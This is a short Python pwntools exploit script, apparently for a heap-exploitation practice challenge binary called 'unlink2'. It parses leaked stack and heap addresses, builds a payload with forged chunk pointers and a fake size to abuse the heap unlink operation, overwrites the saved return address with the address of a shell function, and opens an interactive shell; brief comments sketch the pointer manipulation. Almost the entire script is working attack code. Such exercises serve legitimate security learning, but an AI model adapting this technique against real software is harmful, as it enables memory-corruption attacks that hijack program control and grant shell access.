#!/usr/bin/python3
from pwn import *

exe = './unlink2'
elf = context.binary = ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    set max-visualize-chunk-size 0x500
    b* 0x40120b
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.recvuntil(b"stack address leak: ")
stack = int(p.recvline(), 16)
p.recvuntil(b"heap address leak: ")
heap = int(p.recvline(), 16)

log.info(f"{hex(stack)}, {hex(heap)}")

ret_addr_stack = stack - 40

'''
what is happening ?
prevfd = B->fd
nextbk = B->bk

A
FD:
BK:

B 
FD: main return address in the stack
BK: shell function

C
FD: 
BK:

'''

'''
leave :
mov rsp, rbp
pop rbp
ret: 
pop rip


'''

leaveret = 0x0000000000401330

p.sendline(p64(elf.sym.shell) + p64(0x21) + p64(ret_addr_stack-8) + p64(heap+8) )

p.interactive()
